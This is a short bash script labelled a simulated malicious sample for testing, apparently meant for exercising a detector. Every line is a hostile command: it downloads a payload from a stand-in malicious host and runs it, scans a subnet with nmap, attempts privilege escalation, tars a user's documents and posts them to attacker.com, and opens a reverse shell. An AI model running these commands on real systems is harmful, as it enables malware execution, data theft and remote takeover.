#!/bin/bash
# Simulated malicious script for testing

# Suspicious commands
wget http://malicious-site.com/payload -O /tmp/malware
chmod +x /tmp/malware
/tmp/malware &

# Network scanning
nmap -sS 192.168.1.0/24

# Privilege escalation attempt
sudo su -

# Data exfiltration
tar -czf /tmp/data.tar.gz /home/user/documents
curl -X POST -F "file=@/tmp/data.tar.gz" http://attacker.com/upload

# Reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
